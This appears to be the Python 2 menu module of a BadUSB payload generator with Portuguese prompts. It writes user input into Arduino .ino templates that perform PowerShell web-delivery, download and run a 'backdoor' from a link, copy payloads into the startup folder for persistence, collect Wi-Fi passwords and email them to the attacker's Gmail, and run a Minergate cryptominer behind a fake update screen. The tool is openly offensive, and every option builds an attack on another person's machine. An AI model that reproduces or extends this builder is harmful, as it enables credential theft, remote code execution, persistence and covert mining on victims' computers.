import os
import sys
import fileinput
from logo import *
from mainmenudefs import *
from mainmenu import *

def subpowershellmenu():
    from mainmenu import mainmenu
    print ("""
    1 - Webdelivery Powershell Attack
    2 - Grabb Wifi's passwords from user
    3 - Powershell Download and execute
    4 - Wifi FAST Association and Connect
    5 - Powershell download and send to startup folder
    6 - Wifi Hosted by Windows
    7 - Minergate with fake update screen
    0 - Back to frist select menu
    """)

    submenuselect = raw_input(str("Selecione uma opção: "))

    if submenuselect == "1":
        print ("Webdelivery ok")
        os.system('cls')
        logo1()
        webdlvrypayload = raw_input(str("Cole seu payload: "))
        print (webdlvrypayload)

        f = open('payloads/WebdeliveryPsh.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("WDLVRYPAYLOAD", webdlvrypayload)
        f = open('out/OUT-WebdeliveryPsh/OUT-WebdeliveryPsh.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-WebdeliveryPsh/OUT-WebdeliveryPsh.ino")



    elif submenuselect == "2":

        usermail = raw_input(str("Digite seu Gmail : "))
        print (usermail)
        passwd = raw_input(str("Digite a senha do Gmail : "))
        print (passwd)

        f = open('payloads/WifiGrabbpasswordtoMail.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("EMAIL@gmail.com", usermail).replace("PASSWORD", passwd)
        f = open('out/OUT-WifiGrabbpasswordtoMail.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-WifiGrabbpasswordtoMail.ino")

    elif submenuselect == "3":

        link = raw_input(str("Digite o link do backdoor : "))
        backdoor = raw_input(str("Digite o nome do arquivo : "))


        f = open('payloads/Psdownandexecute.ino', 'r')
        filedata = f.read()
        f.close()
        newdata = filedata.replace("HOST", link).replace("PAYLOAD", backdoor)
        f = open('out/OUT-Psdownandexecute.ino', 'w')
        f.write(newdata)
        f.close()
        os.system("start out/OUT-Psdownandexecute.ino")


    elif submenuselect == "4":
        link = raw_input(str("Digite o link pastebin : "))
	essid = raw_input(str("Digite o nome da rede : "))
	f = open('payloads/wifiassociationFast.ino', 'r')
	filedata = f.read()
	f.close()
	newdata = filedata.replace("PASTEBIN", link).replace("ESSID", essid)
	f = open('out/OUT-wifiassociationFast.ino', 'w')
	f.write(newdata)
	f.close()
	os.system("start out/OUT-wifiassociationFast.ino")


    elif submenuselect == "5":
        paste = raw_input(str("Digite o link pastebin : "))
	payname = raw_input(str("Digite o nome do payload : "))
	f = open('payloads/Psdownforstartup.ino', 'r')
	filedata = f.read()
	f.close()
	newdata = filedata.replace("HOST", paste).replace("PAYLOAD", payname)
	f = open('out/OUT-Psdownforstartup.ino', 'w')
	f.write(newdata)
	f.close()
	os.system("start out/OUT-Psdownforstartup.ino")

    elif submenuselect == "6":
        essid = raw_input(str("Digite o nome da rede : "))
	password = raw_input(str("Digite o senha para a rede : "))
	f = open('payloads/hostedwificreate.ino', 'r')
	filedata = f.read()
	f.close()
	newdata = filedata.replace("ESSID", essid).replace("PASSWORD", password)
	f = open('out/OUT-hostedwificreate.ino', 'w')
	f.write(newdata)
	f.close()
	os.system("start out/OUT-hostedwificreate.ino")

    elif submenuselect == "7":
        mguser = raw_input(str("Digite seu usuario Minergate : "))
    	mgcoin = raw_input(str("Digite o tipo de moeda que deseja minerar : "))
        mgcore = raw_input(str("Digite o numero de cpu's que deseja usar : "))
    	f = open('payloads/Minergatefakeupdate.ino', 'r')
    	filedata = f.read()
    	f.close()
    	newdata = filedata.replace("MGUSER", mguser).replace("MGCOIN", mgcoin).replace("MGCORE", mgcore)
    	f = open('out/OUT-Minergatefakeupdate.ino', 'w')
    	f.write(newdata)
    	f.close()
    	os.system("start out/OUT-Minergatefakeupdate.ino")

    elif submenuselect == "0":
        os.system('cls')
        logo1()
        mainmenu()
    else:
        os.system('cls')
        logo1()
        print ("Selecione uma opção valida!!")
        subpowershellmenu();
